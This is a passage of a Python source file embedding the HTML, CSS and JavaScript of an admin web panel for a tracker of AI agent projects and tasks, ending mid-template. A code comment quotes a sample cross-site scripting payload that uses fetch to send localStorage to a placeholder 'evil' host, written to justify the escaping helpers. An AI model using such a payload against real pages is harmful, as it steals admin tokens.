# =============================================================================
# Tracker Web Panel — modules/tracker/panel.py
# =============================================================================
# WHAT: A single self-contained admin console (inline CSS + JS, no build step,
#       no external assets) served by the tracker. Jira/Notion-style:
#         - Overview: global analytics (status donut, per-project bars, feed)
#         - Fleet: the CROSS-PROJECT live view — who is doing what right now,
#           questions waiting on the owner, projects waiting to enroll
#         - Projects: cards → per-project detail
#         - Project detail tabs: Board · Queue (drag to reorder) · List · Team
#           · Analytics
#         - Team: the project's fleet drawn as the ORG CHART it actually is —
#           the human owner on top, then the Product Owner agent (when the
#           project runs one), then the architect, then a column per area with
#           each lead over its developers, and a cross-cutting band for
#           reviewers. Each top row is optional: no PO means the architect hangs
#           straight off the owner, exactly as before.
#           The panel does NO inference for this: `tier`/`area`/`reports_to`
#           arrive already normalised by modules/tracker/roster.py, which is
#           the single place that decides what an agent is.
#
# WHY most of it is derived client-side: the panel calls a handful of admin
#   endpoints (GET /projects, /tasks, /agents, plus /questions and /activity for
#   the v2 surfaces) and computes boards, rosters and analytics in the browser.
#   Nothing here changes the contract external pollers speak.
#
# WHY it is no longer read-only (Step 6 of docs/tracker-v2-plan.md): the v2
#   states are `blocked` and `review` — states that exist precisely because the
#   fleet is WAITING FOR THE OWNER. A console that could show a blocked agent
#   but not answer it meant every unsticking action went through Кая or curl.
#   The five write actions are exactly the ones that unblock something:
#   approve a project · answer a question · reorder a queue · cancel · requeue.
#
# WHY writes are safe to expose here: every one of them is already reachable
#   with the same admin token via the API, and each maps to a single store
#   operation that enforces the same rules (the transition map refuses an
#   illegal cancel with a 409, and the panel shows the server's own message).
#   Nothing here can do something Кая could not already do.
#
# AUTH: the page holds no secrets. The admin token is typed into a login box,
#   kept in localStorage, and sent as the Bearer on every request; a 401 clears
#   it and returns to login.
# =============================================================================

from aiohttp import web

PANEL_HTML = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Kaizen Tracker</title>
<style>
  :root {
    --bg:#0e1014; --panel:#161922; --panel2:#1d212c; --panel3:#232838;
    --border:#2a2f3c; --text:#e7eaf0; --muted:#98a2b3; --accent:#5b9dff;
    --queued:#6b7280; --dispatched:#5b9dff; --running:#e0a94a;
    --blocked:#f0883e; --review:#8957e5;
    --done:#3fb950; --failed:#f85149; --cancelled:#a371f7;
    --radius:10px;
  }
  html[data-theme="light"] {
    --bg:#f5f6f8; --panel:#ffffff; --panel2:#f0f2f5; --panel3:#e8ebf0;
    --border:#dce0e8; --text:#1b2028; --muted:#5b6472;
  }
  * { box-sizing:border-box; }
  body { margin:0; background:var(--bg); color:var(--text);
    font:14px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; }
  a { color:inherit; text-decoration:none; }
  button { font:inherit; cursor:pointer; }

  /* ---- login ---- */
  .login { max-width:420px; margin:14vh auto; background:var(--panel);
    border:1px solid var(--border); border-radius:14px; padding:30px; }
  .login h2 { margin:0 0 4px; font-size:20px; }
  .login p { color:var(--muted); margin:0 0 18px; }
  .login input { width:100%; padding:11px 12px; border-radius:8px;
    border:1px solid var(--border); background:var(--panel2); color:var(--text);
    font-size:14px; margin-bottom:12px; }
  .login .go { width:100%; padding:11px; background:var(--accent); color:#08111f;
    border:none; border-radius:8px; font-weight:700; }
  .err { color:var(--failed); font-size:13px; min-height:18px; margin-bottom:6px; }

  /* ---- shell ---- */
  .shell { display:grid; grid-template-columns:230px 1fr; min-height:100vh; }
  .side { background:var(--panel); border-right:1px solid var(--border);
    padding:16px 12px; position:sticky; top:0; height:100vh; overflow-y:auto; }
  .brand { font-weight:700; font-size:15px; padding:6px 10px 14px; }
  .nav a { display:flex; align-items:center; gap:9px; padding:8px 10px;
    border-radius:8px; color:var(--muted); font-weight:500; }
  .nav a.active, .nav a:hover { background:var(--panel2); color:var(--text); }
  .side .label { color:var(--muted); font-size:11px; letter-spacing:.08em;
    text-transform:uppercase; padding:16px 10px 6px; }
  .side .plink { display:flex; justify-content:space-between; padding:7px 10px;
    border-radius:8px; color:var(--muted); font-size:13px; }
  .side .plink.active, .side .plink:hover { background:var(--panel2); color:var(--text); }
  .side .plink .n { color:var(--muted); font-size:12px; }
  .side .foot { position:sticky; bottom:0; padding-top:14px; display:flex; gap:8px; }
  .side .foot button { flex:1; background:var(--panel2); color:var(--text);
    border:1px solid var(--border); border-radius:8px; padding:7px; font-size:12px; }

  main { padding:22px 26px; max-width:1240px; }
  .top { display:flex; align-items:center; gap:12px; margin-bottom:20px; }
  .top h1 { font-size:20px; margin:0; }
  .crumb { color:var(--muted); }
  .live { margin-left:auto; color:var(--muted); font-size:12px; display:flex;
    align-items:center; gap:6px; }
  .dot { width:8px; height:8px; border-radius:50%; background:var(--done);
    box-shadow:0 0 0 0 var(--done); animation:pulse 2s infinite; }
  @keyframes pulse { 0%{box-shadow:0 0 0 0 rgba(63,185,80,.5)} 70%{box-shadow:0 0 0 6px rgba(63,185,80,0)} }

  /* ---- stat tiles ---- */
  .tiles { display:grid; grid-template-columns:repeat(4,1fr); gap:14px; margin-bottom:22px; }
  .tile { background:var(--panel); border:1px solid var(--border);
    border-radius:var(--radius); padding:16px; }
  .tile .k { color:var(--muted); font-size:12px; }
  .tile .v { font-size:26px; font-weight:700; margin-top:6px; }
  .tile .s { color:var(--muted); font-size:12px; margin-top:2px; }

  .grid2 { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
  .card { background:var(--panel); border:1px solid var(--border);
    border-radius:var(--radius); padding:16px; margin-bottom:16px; }
  .card h3 { margin:0 0 14px; font-size:14px; }

  /* ---- charts ---- */
  .donutwrap { display:flex; align-items:center; gap:18px; }
  .donut-num { font-size:26px; font-weight:700; fill:var(--text); }
  .donut-lbl { font-size:11px; fill:var(--muted); }
  .legend { display:flex; flex-direction:column; gap:6px; font-size:13px; }
  .legend .row { display:flex; align-items:center; gap:8px; }
  .legend .sw { width:10px; height:10px; border-radius:3px; }
  .legend .cnt { margin-left:auto; color:var(--muted); font-variant-numeric:tabular-nums; }
  .bars .barrow { display:grid; grid-template-columns:120px 1fr 40px; align-items:center;
    gap:10px; margin-bottom:8px; font-size:13px; }
  .bars .track { background:var(--panel2); border-radius:6px; height:12px; overflow:hidden; }
  .bars .fill { height:100%; background:var(--accent); border-radius:6px; }
  .bars .val { color:var(--muted); text-align:right; font-variant-numeric:tabular-nums; }

  /* ---- project cards ---- */
  .pgrid { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:14px; }
  .pcard { background:var(--panel); border:1px solid var(--border);
    border-radius:var(--radius); padding:16px; display:block; }
  .pcard:hover { border-color:var(--accent); }
  .pcard .name { font-weight:600; font-size:15px; }
  .pcard .desc { color:var(--muted); font-size:13px; margin:4px 0 12px; min-height:18px; }
  .pcard .mini { display:flex; gap:6px; flex-wrap:wrap; }

  /* ---- tabs ---- */
  .tabs { display:flex; gap:4px; border-bottom:1px solid var(--border); margin-bottom:18px; }
  .tabs a { padding:9px 14px; color:var(--muted); font-weight:500; border-bottom:2px solid transparent; }
  .tabs a.active { color:var(--text); border-bottom-color:var(--accent); }

  /* ---- kanban ---- */
  .board { display:flex; gap:14px; overflow-x:auto; padding-bottom:8px; }
  .col { flex:0 0 260px; background:var(--panel); border:1px solid var(--border);
    border-radius:var(--radius); padding:12px; }
  .col h4 { margin:0 0 12px; font-size:13px; display:flex; align-items:center; gap:8px; }
  .col h4 .cnt { margin-left:auto; color:var(--muted); font-size:12px; }
  .tcard { background:var(--panel2); border:1px solid var(--border); border-radius:8px;
    padding:11px; margin-bottom:10px; }
  .tcard .tt { font-weight:500; font-size:13px; }
  .tcard .tm { color:var(--muted); font-size:12px; margin-top:5px; display:flex;
    align-items:center; gap:6px; flex-wrap:wrap; }
  .tcard .sum { font-size:12px; margin-top:6px; color:var(--text); }
  .tcard .er { font-size:12px; margin-top:6px; color:var(--failed); white-space:pre-wrap; }
  .tcard .arts a { color:var(--accent); font-size:12px; margin-right:8px; }

  /* ---- write actions (Step 6): buttons, toast, queue, fleet ---- */
  .mini { background:var(--panel3); color:var(--text); border:1px solid var(--border);
          border-radius:6px; padding:3px 9px; font-size:12px; cursor:pointer; }
  .mini:hover { border-color:var(--accent); }
  .mini.go { background:var(--accent); border-color:var(--accent); color:#fff; }
  .mini.bad:hover { border-color:var(--failed); color:var(--failed); }
  .notice { background:var(--panel2); border:1px solid var(--border); border-left:3px solid var(--blocked);
            border-radius:var(--radius); padding:10px 14px; margin-bottom:14px; font-size:13px; }
  #toast { position:fixed; right:18px; bottom:18px; z-index:50; max-width:420px;
           background:var(--panel3); color:var(--text); border:1px solid var(--border);
           border-left:3px solid var(--done); border-radius:var(--radius);
           padding:10px 14px; font-size:13px; opacity:0; transition:opacity .25s; }
  #toast.bad { border-left-color:var(--failed); }
  .qrow { display:flex; align-items:center; gap:12px; padding:9px 0; border-bottom:1px solid var(--border); }
  .qrow:last-child { border-bottom:none; }
  .qbox { border:1px solid var(--border); border-radius:var(--radius); padding:12px; margin-bottom:10px; }
  .qhd { font-size:12px; color:var(--muted); margin-bottom:6px; }
  .qtext { font-size:14px; margin-bottom:8px; white-space:pre-wrap; }
  .sugg { display:flex; gap:6px; flex-wrap:wrap; margin-bottom:8px; }
  .qact { display:flex; gap:8px; }
  .qact input { flex:1; background:var(--panel2); color:var(--text); border:1px solid var(--border);
                border-radius:6px; padding:7px 10px; font-size:13px; }
  .livebox { border:1px solid var(--border); border-radius:var(--radius); margin-bottom:10px; overflow:hidden; }
  .lhd { display:flex; align-items:center; gap:8px; padding:9px 12px; background:var(--panel2); font-size:13px; }
  .lrow { display:flex; align-items:center; gap:8px; padding:7px 12px; font-size:13px;
          border-top:1px solid var(--border); }
  .qitem { display:flex; align-items:center; gap:10px; padding:9px 12px; font-size:13px;
           border:1px solid var(--border); border-radius:8px; margin-bottom:6px;
           background:var(--panel2); cursor:grab; }
  .qitem.dragging { opacity:.4; border-color:var(--accent); }
  .grip { color:var(--muted); cursor:grab; }
  .n.alert { background:var(--blocked); color:#fff; }
  .acts { display:flex; gap:6px; margin-top:8px; }

  /* ---- badges / avatars ---- */
  .badge { display:inline-block; padding:2px 9px; border-radius:20px; font-size:11px;
    font-weight:700; color:#08111f; }
  html[data-theme="light"] .badge { color:#fff; }
  .avatar { width:30px; height:30px; border-radius:50%; display:inline-flex;
    align-items:center; justify-content:center; font-size:12px; font-weight:700;
    color:#08111f; background:var(--accent); flex:0 0 auto; }
  html[data-theme="light"] .avatar { color:#fff; }

  /* ---- team: the fleet as an org chart ----
     Boxes and connector lines, not an indented list: the shape of a fleet is
     the information here — who answers to whom, and which team owns what.
     Connectors are borders on the boxes' wrappers, so there is no SVG, no
     layout maths, and the chart reflows on a narrow window instead of
     overflowing. */
  .online { color:var(--done); }
  .kind { font-size:10px; font-weight:600; padding:1px 6px; border-radius:10px;
    vertical-align:middle; }
  .kind.ai { background:var(--panel3); color:var(--accent); }
  .kind.human { background:var(--panel3); color:var(--cancelled); }

  .org { display:flex; flex-direction:column; align-items:center; }
  .orow { display:flex; justify-content:center; gap:14px; }
  .orow.wrap { flex-wrap:wrap; }
  /* The vertical line joining the top rows: owner → product owner → architect. */
  .ostem { width:1px; height:22px; background:var(--border); }
  /* The line from the architect down into the row of area columns. */
  .ofan { width:1px; height:22px; background:var(--border); }

  .ocols { display:flex; gap:16px; align-items:flex-start; flex-wrap:wrap;
    justify-content:center; width:100%; position:relative; padding-top:14px; }
  /* One horizontal rule across the columns, so they read as siblings of the
     architect rather than as unrelated blocks. */
  .ocols::before { content:""; position:absolute; top:0; left:12%; right:12%;
    height:1px; background:var(--border); }
  .ocol { flex:1 1 260px; min-width:240px; border:1px solid var(--border);
    border-radius:var(--radius); background:var(--panel2); position:relative; }
  /* The short drop from that rule into each column. */
  .ocol::before { content:""; position:absolute; top:-14px; left:50%; width:1px;
    height:14px; background:var(--border); }
  .ocolhd { text-align:center; font-size:11px; letter-spacing:.1em;
    text-transform:uppercase; color:var(--muted); padding:9px 10px;
    border-bottom:1px solid var(--border); }
  .ocolbody { padding:14px 10px; display:flex; flex-direction:column;
    align-items:center; gap:0; }

  /* A node and its children. The vertical stub belongs to the CHILD row, so a
     leaf draws no dangling line. */
  .onode { display:flex; flex-direction:column; align-items:center; }
  .okids { display:flex; gap:10px; align-items:flex-start; justify-content:center;
    position:relative; padding-top:16px; }
  .okids::before { content:""; position:absolute; top:0; left:25%; right:25%;
    height:1px; background:var(--border); }
  .okids > .onode { position:relative; }
  .okids > .onode::before { content:""; position:absolute; top:-16px; left:50%;
    width:1px; height:16px; background:var(--border); }
  /* A single child needs no horizontal rule — just the stub. */
  .okids:has(> .onode:only-child)::before { display:none; }

  .ocard { width:190px; background:var(--panel); border:1px solid var(--border);
    border-radius:var(--radius); padding:12px 10px; text-align:center;
    position:relative; }
  .ocard:hover { border-color:var(--accent); }
  .ocard.human { border-color:var(--cancelled); }
  .oav { width:34px; height:34px; border-radius:50%; display:inline-flex;
    align-items:center; justify-content:center; font-size:12px; font-weight:700;
    color:#08111f; background:var(--accent); margin-bottom:7px; }
  .oname { font-weight:600; font-size:13px; }
  .orole { color:var(--muted); font-size:11px; margin-bottom:5px; }
  .omodel { display:inline-block; font-size:9px; font-weight:700; letter-spacing:.06em;
    color:var(--review); background:var(--panel3); border:1px solid var(--border);
    border-radius:4px; padding:1px 6px; margin-bottom:5px; }
  .ostate { font-size:11px; }
  .onow { color:var(--muted); font-size:10px; margin-top:4px; overflow:hidden;
    text-overflow:ellipsis; white-space:nowrap; }

  .oband { width:100%; margin-top:22px; padding-top:14px;
    border-top:1px solid var(--border); }
  .obandhd { text-align:center; font-size:11px; letter-spacing:.1em;
    text-transform:uppercase; color:var(--muted); margin-bottom:12px; }

  /* One colour per area, on the avatar, so a team is recognisable at a glance.
     `area-` classes are emitted from a sanitised token (see areaClass). */
  .oav.area-backend  { background:#5b9dff; }
  .oav.area-frontend { background:#ff7ab6; }
  .oav.area-mobile,
  .oav.area-android  { background:#3fb950; }
  .oav.area-ios      { background:#56d4dd; }
  .oav.area-infra    { background:#a371f7; }
  .oav.area-security { background:#f85149; }
  .oav.area-qa       { background:#f0883e; }
  .oav.area-design   { background:#ff7ab6; }
  .oav.area-data     { background:#56d4dd; }
  .oav.area-research { background:#8957e5; }
  .oav.area-owner,
  .oav.area-product,
  .oav.area-architect { background:#e0a94a; }
  .oav.area-reviewer { background:#a371f7; }

  /* ---- table ---- */
  table.tbl { width:100%; border-collapse:collapse; }
  table.tbl th { text-align:left; color:var(--muted); font-weight:500; font-size:12px;
    padding:8px 10px; border-bottom:1px solid var(--border); }
  table.tbl td { padding:10px; border-bottom:1px solid var(--border); vertical-align:top; }
  table.tbl tr:hover td { background:var(--panel); }
  .id { color:var(--muted); font-variant-numeric:tabular-nums; }

  .empty { color:var(--muted); text-align:center; padding:44px; }
  .filters { display:flex; gap:10px; margin-bottom:14px; }
  select { background:var(--panel2); color:var(--text); border:1px solid var(--border);
    border-radius:7px; padding:7px 10px; font-size:13px; }
  .feed .frow { display:flex; align-items:center; gap:10px; padding:8px 0;
    border-bottom:1px solid var(--border); font-size:13px; }
  .feed .frow:last-child { border-bottom:none; }
  .feed .ft { color:var(--muted); margin-left:auto; font-size:12px; }
</style>
</head>
<body>
<div id="root"></div>
<script>
const KEY = "tracker_admin_token", THEME = "tracker_theme";
// The v2 Directive lifecycle (docs/tracker-architecture.md §4). `blocked` and
// `review` are the two states v1 could not express, and both are the ones the
// owner most needs to SEE — they mean the fleet is waiting on them.
const STATUSES = ["queued","dispatched","running","blocked","review","done","failed","cancelled"];
const ACTIVE_ST = ["dispatched","running","blocked","review"];
let projectsCache = [], tasksCache = [], agentsCache = [];
let questionsCache = [], activityCache = [], usageCache = [];
// Set while a drag is in progress, an answer box is focused, or a write is in
// flight, and checked by the refresh timer: re-rendering under the user's
// cursor would drop the row they are dragging, or take the focus out of a
// half-typed answer.
let busy = false;
// What the owner has typed into each question's answer box, kept OUTSIDE the
// DOM. The fleet view is rebuilt from scratch on every refresh (and after every
// write), and an <input> rebuilt from a template comes back empty — so the text
// has to live somewhere that survives the re-render.
const answerDrafts = {};

/* ---------- utils ---------- */
function token(){ return localStorage.getItem(KEY) || ""; }
function esc(s){ return (s==null?"":String(s)).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c])); }
/* A string safe to drop into a JS argument list inside an onclick="..." — TWO
   nested contexts, which is why esc() alone is not enough there.

   esc() does not touch the single quote, so `onclick="f('${esc(name)}')"` is
   broken out of by a project named `x');fetch('//evil/'+localStorage...`. And
   the browser HTML-decodes an attribute BEFORE the JS parser sees it, so a
   payload containing the literal text `&quot;` breaks out of a double-quoted
   JS string the same way. Both are reachable by anything that can call the
   Hub's Register (a project name, an agent slug, a suggested answer).

   JSON.stringify produces a correctly escaped JS literal — quotes, backslashes
   and newlines included — and esc() then makes that literal survive HTML
   attribute decoding intact (it escapes & first, so no entity can be smuggled
   through). The two together are what makes the round trip exact. */
function jsq(v){ return esc(JSON.stringify(v==null?"":String(v))); }
/* An artifact URL is text a PROJECT reported. esc() keeps it inside the
   attribute, but `javascript:...` in an href needs no quote to escape: one
   click would run it on a page whose localStorage holds the admin token. Only
   real links are linked; anything else keeps its label and goes nowhere. */
function safeUrl(u){ const s=String(u==null?"":u).trim(); return /^https?:\/\//i.test(s)?s:"#"; }
function fmtTime(s){ return (s||"").replace("T"," ").slice(0,16); }
function initials(n){ const p=String(n||"?").replace(/[^a-zA-Z0-9]+/g," ").trim().split(" "); return ((p[0]||"?")[0]+((p[1]||"")[0]||"")).toUpperCase(); }
function badge(st){ return `<span class="badge" style="background:var(--${st})">${st}</span>`; }
function esum(a,b){ return a+b; }

async function api(path){
  const r = await fetch(path,{headers:{Authorization:"Bearer "+token()}});
  if(r.status===401){ localStorage.removeItem(KEY); throw new Error("unauthorized"); }
  if(!r.ok) throw new Error("HTTP "+r.status);
  return r.json();
}
/* Every WRITE goes through here (Step 6). It returns the parsed body on 2xx and
   throws with the server's own message otherwise — the tracker answers 409 with
   a precise explanation ("cannot go done -> running"), and showing that beats a
   generic "something went wrong". */
async function post(path, body){
  busy = true;
  try{
    const r = await fetch(path,{
      method:"POST",
      headers:{Authorization:"Bearer "+token(),"Content-Type":"application/json"},
      body: body===undefined?undefined:JSON.stringify(body),
    });
    if(r.status===401){ localStorage.removeItem(KEY); throw new Error("unauthorized"); }
    const data = await r.json().catch(()=>({}));
    if(!r.ok) throw new Error(data.error || ("HTTP "+r.status));
    return data;
  } finally { busy = false; }
}
/* One place that runs a write, reports it, and refreshes — so no action can
   forget to do any of the three. Returns whether the write actually landed, so
   a caller holding local state (the answer drafts) knows when to drop it. */
async function act(path, body, okMsg){
  try{
    const data = await post(path, body);
    toast(typeof okMsg==="function"?okMsg(data):okMsg);
    await loadData(); renderView();
    return true;
  }catch(e){
    if(String(e.message)==="unauthorized"){ renderLogin("Session expired."); return false; }
    toast("⚠ "+e.message, true);
    return false;
  }
}
function toast(msg, bad){
  let el=document.getElementById("toast");
  if(!el){ el=document.createElement("div"); el.id="toast"; document.body.appendChild(el); }
  el.className = bad?"bad":"";
  el.textContent = msg;
  el.style.opacity = "1";
  clearTimeout(el._t);
  el._t = setTimeout(()=>{ el.style.opacity="0"; }, 4000);
}

async function loadData(){
  // Questions and activity are v2 surfaces; an older tracker (or a transient
  // error on one of them) must not blank the whole console, so each degrades
  // to empty on its own.
  const [p,t,a,q,act_,u] = await Promise.all([
    api("/projects"), api("/tasks"), api("/agents"),
    api("/questions").catch(()=>({questions:[]})),
    api("/activity").catch(()=>({activity:[]})),
    api("/usage").catch(()=>({usage:[]})),
  ]);
  projectsCache = p.projects||[]; tasksCache = t.tasks||[]; agentsCache = a.agents||[];
  questionsCache = q.questions||[]; activityCache = act_.activity||[]; usageCache = u.usage||[];
}

/* ---------- derivations ---------- */
function projByName(n){ return projectsCache.find(p=>p.name===n); }
function tasksOfProject(name){ const p=projByName(name); return p?tasksCache.filter(t=>t.project_id===p.id):[]; }
function statusCounts(tasks){ const c={}; STATUSES.forEach(s=>c[s]=0); tasks.forEach(t=>{ if(c[t.status]!=null)c[t.status]++; }); return c; }
function completion(tasks){ const d=tasks.filter(t=>t.status==="done").length, f=tasks.filter(t=>t.status==="failed").length; const tot=d+f; return tot?Math.round(100*d/tot):0; }
function activeAgents(tasks){ return new Set(tasks.filter(t=>ACTIVE_ST.includes(t.status)&&t.claimed_by).map(t=>t.claimed_by)).size; }
function agentsOf(tasks){
  const m=new Map();
  for(const t of tasks){
    if(!t.claimed_by) continue;
    let a=m.get(t.claimed_by)||{name:t.claimed_by,total:0,done:0,failed:0,active:0,current:null,last:""};
    a.total++;
    if(t.status==="done")a.done++; else if(t.status==="failed")a.failed++;
    if(ACTIVE_ST.includes(t.status)){ a.active++; if(!a.current)a.current=t; }
    if((t.updated_at||"")>a.last)a.last=t.updated_at||"";
    m.set(t.claimed_by,a);
  }
  return [...m.values()].sort((x,y)=>(y.last||"").localeCompare(x.last||""));
}

/* ---------- charts ---------- */
function donut(counts){
  const entries = STATUSES.map(s=>[s,counts[s]]).filter(([,n])=>n>0);
  const total = entries.map(([,n])=>n).reduce(esum,0)||0;
  const R=54,C=2*Math.PI*R; let off=0;
  const segs = total? entries.map(([s,n])=>{
    const len=C*n/total;
    const seg=`<circle r="${R}" cx="80" cy="80" fill="none" stroke="var(--${s})" stroke-width="20" stroke-dasharray="${len.toFixed(2)} ${(C-len).toFixed(2)}" stroke-dashoffset="${(-off).toFixed(2)}" transform="rotate(-90 80 80)"/>`;
    off+=len; return seg;
  }).join("") : `<circle r="54" cx="80" cy="80" fill="none" stroke="var(--panel2)" stroke-width="20"/>`;
  const legend = entries.map(([s,n])=>`<div class="row"><span class="sw" style="background:var(--${s})"></span>${s}<span class="cnt">${n}</span></div>`).join("") || `<div class="row" style="color:var(--muted)">no tasks yet</div>`;
  return `<div class="donutwrap">
    <svg viewBox="0 0 160 160" width="150" height="150">${segs}
      <text x="80" y="78" text-anchor="middle" class="donut-num">${total}</text>
      <text x="80" y="98" text-anchor="middle" class="donut-lbl">tasks</text></svg>
    <div class="legend">${legend}</div></div>`;
}
function bars(rows, color){
  const max = Math.max(1,...rows.map(r=>r.v));
  return `<div class="bars">`+rows.map(r=>`<div class="barrow">
      <div>${esc(r.k)}</div>
      <div class="track"><div class="fill" style="width:${100*r.v/max}%;${color?`background:${color}`:""}"></div></div>
      <div class="val">${r.v}</div></div>`).join("")+`</div>`;
}

/* ---------- shell + router ---------- */
function currentRoute(){
  const h=(location.hash||"#/").replace(/^#/,"");
  const parts=h.split("/").filter(Boolean); // ["project","name","board"]
  if(parts[0]==="projects") return {view:"projects"};
  if(parts[0]==="fleet") return {view:"fleet"};
  if(parts[0]==="project") return {view:"project", name:decodeURIComponent(parts[1]||""), tab:parts[2]||"board"};
  return {view:"overview"};
}
function sidebar(){
  const r=currentRoute();
  // Everything that is waiting on the OWNER, in one number — the only count
  // worth putting in the chrome, because it is the only one they can act on.
  const waiting = questionsCache.length + projectsCache.filter(p=>p.state==="pending").length;
  const plinks = projectsCache.map(p=>{
    const n=tasksCache.filter(t=>t.project_id===p.id).length;
    const on = r.view==="project"&&r.name===p.name?" active":"";
    return `<a class="plink${on}" href="#/project/${encodeURIComponent(p.name)}"><span>${esc(p.name)}</span><span class="n">${n}</span></a>`;
  }).join("") || `<div class="plink" style="color:var(--muted)">none yet</div>`;
  const th = localStorage.getItem(THEME)==="light"?"☀️":"🌙";
  return `<aside class="side">
    <div class="brand">🗂️ Kaizen Tracker</div>
    <div class="nav">
      <a href="#/" class="${r.view==="overview"?"active":""}">📊 Overview</a>
      <a href="#/fleet" class="${r.view==="fleet"?"active":""}">🛠️ Fleet${waiting?`<span class="n alert">${waiting}</span>`:""}</a>
      <a href="#/projects" class="${r.view==="projects"?"active":""}">📁 Projects</a>
    </div>
    <div class="label">Projects</div>
    ${plinks}
    <div class="foot">
      <button onclick="toggleTheme()">${th} Theme</button>
      <button onclick="logout()">Log out</button>
    </div>
  </aside>`;
}
function renderShell(){
  document.getElementById("root").innerHTML =
    `<div class="shell">${sidebar()}<main id="content"></main></div>`;
  renderView();
}
function renderView(){
  const r=currentRoute();
  const c=document.getElementById("content");
  if(!c) return renderShell();
  // Keep the sidebar's active highlight in sync with the current route —
  // it's a separate element from #content, so navigation must refresh it too.
  const s=document.querySelector(".side");
  if(s) s.outerHTML=sidebar();
  if(r.view==="projects") c.innerHTML=viewProjects();
  else if(r.view==="fleet") c.innerHTML=viewFleet();
  else if(r.view==="project") c.innerHTML=viewProject(r.name,r.tab);
  else c.innerHTML=viewOverview();
  if(r.view==="project" && r.tab==="queue") wireQueueDrag();
}
function topbar(title, crumb){
  return `<div class="top"><h1>${title}</h1>${crumb?`<span class="crumb">${crumb}</span>`:""}
    <span class="live"><span class="dot"></span>live · every 7s</span></div>`;
}

/* ---------- views ---------- */
function viewOverview(){
  const counts=statusCounts(tasksCache);
  const perProject = projectsCache.map(p=>({k:p.name,v:tasksCache.filter(t=>t.project_id===p.id).length}))
                     .sort((a,b)=>b.v-a.v).slice(0,8);
  const feed = [...tasksCache].sort((a,b)=>(b.updated_at||"").localeCompare(a.updated_at||"")).slice(0,8).map(t=>{
    const p=projectsCache.find(x=>x.id===t.project_id);
    return `<div class="frow">${badge(t.status)}<span>${esc(t.title)}</span>
      <span style="color:var(--muted)">· ${esc(p?p.name:"")}${t.claimed_by?" · "+esc(t.claimed_by):""}</span>
      <span class="ft">${fmtTime(t.updated_at)}</span></div>`;
  }).join("") || `<div class="empty">No activity yet.</div>`;
  return topbar("Overview")+`
    <div class="tiles">
      <div class="tile"><div class="k">Projects</div><div class="v">${projectsCache.length}</div></div>
      <div class="tile"><div class="k">Tasks</div><div class="v">${tasksCache.length}</div><div class="s">${counts.done} done · ${counts.failed} failed</div></div>
      <div class="tile"><div class="k">Active agents</div><div class="v">${activeAgents(tasksCache)}</div><div class="s">working right now</div></div>
      <div class="tile"><div class="k">Completion rate</div><div class="v">${completion(tasksCache)}%</div><div class="s">done vs failed</div></div>
    </div>
    <div class="grid2">
      <div class="card"><h3>Status breakdown</h3>${donut(counts)}</div>
      <div class="card"><h3>Tasks per project</h3>${perProject.length?bars(perProject):'<div class="empty">No projects.</div>'}</div>
    </div>
    <div class="card feed"><h3>Recent activity</h3>${feed}</div>`;
}
function viewProjects(){
  const cards = projectsCache.map(p=>{
    const ts=tasksCache.filter(t=>t.project_id===p.id);
    const c=statusCounts(ts);
    const mini=STATUSES.filter(s=>c[s]>0).map(s=>`<span class="badge" style="background:var(--${s})">${c[s]} ${s}</span>`).join("");
    return `<a class="pcard" href="#/project/${encodeURIComponent(p.name)}">
      <div class="name">${esc(p.name)}</div>
      <div class="desc">${esc(p.description||"")}</div>
      <div class="mini">${mini||'<span style="color:var(--muted)">no tasks</span>'}</div>
    </a>`;
  }).join("");
  return topbar("Projects")+(cards?`<div class="pgrid">${cards}</div>`:`<div class="empty">No projects registered. Ask Kaya to connect one.</div>`);
}
function projectTabs(name,tab){
  const t=(id,lbl)=>`<a class="${tab===id?"active":""}" href="#/project/${encodeURIComponent(name)}/${id}">${lbl}</a>`;
  return `<div class="tabs">${t("board","Board")}${t("queue","Queue")}${t("list","List")}${t("team","Team")}${t("analytics","Analytics")}</div>`;
}
function viewProject(name,tab){
  const p=projByName(name);
  if(!p) return topbar("Project")+`<div class="empty">No project named "${esc(name)}".</div>`;
  const ts=tasksOfProject(name);
  let body;
  if(tab==="list") body=tabList(ts);
  else if(tab==="queue") body=tabQueue(p, ts);
  else if(tab==="team") body=tabTeam(ts, p.id);
  else if(tab==="analytics") body=tabAnalytics(ts, p);
  else body=tabBoard(ts);
  const head = p.state!=="active"
    ? `<div class="notice">This project is <b>${esc(p.state)}</b>${p.state==="pending"
        ?` — <button class="mini go" onclick="approveProject(${jsq(p.name)})">approve it</button>`
        :""}. Nothing will be dispatched to it until it is active.</div>`
    : "";
  return topbar(esc(name), esc(p.purpose||p.description||""))+projectTabs(name,tab)+head+body;
}

/* ---------- the write actions (Step 6) ---------- */
function approveProject(name){
  act(`/projects/${encodeURIComponent(name)}/approve`, undefined,
      `Approved "${name}" — its Warden picks up a token on its next check-in.`);
}
function cancelDirective(id){
  const reason = prompt("Cancel #"+id+" — why? (kept on the record)", "cancelled from the panel");
  if(reason===null) return;
  act(`/tasks/${id}/cancel`, {reason},
      d => d.project_told ? `#${id} cancelled; the project stopped working on it.`
                          : `#${id} cancelled in the tracker (the project was not reachable).`);
}
function requeueDirective(id){
  act(`/tasks/${id}/requeue`, undefined, `#${id} is back in the queue.`);
}
async function answerQuestion(id){
  const box=document.getElementById("ans-"+id);
  const answer=((box&&box.value)||answerDrafts[id]||"").trim();
  if(!answer){ toast("Type an answer first.", true); return; }
  // The draft is dropped only once the Hub has taken the answer: on a 409/500
  // the text stays in the box AND in the map, so a failed send never costs the
  // owner what they typed.
  if(await act(`/questions/${id}/answer`, {answer}, `Answered — the agent resumes within seconds.`))
    delete answerDrafts[id];
}
function useSuggestion(id, text){
  answerDrafts[id]=text;
  const box=document.getElementById("ans-"+id);
  if(box){ box.value=text; box.focus(); }
}

/* ---------- fleet: the cross-project view ---------- */
function viewFleet(){
  const pendingProjects = projectsCache.filter(p=>p.state==="pending"||p.state==="approved");
  const enroll = pendingProjects.length ? `<div class="card"><h3>Waiting to enroll</h3>${
    pendingProjects.map(p=>`<div class="qrow">
      <div><b>${esc(p.name)}</b> <span class="badge" style="background:var(--queued)">${esc(p.state)}</span>
        <div style="color:var(--muted);font-size:12px">${esc(p.purpose||p.description||"no description given")}</div></div>
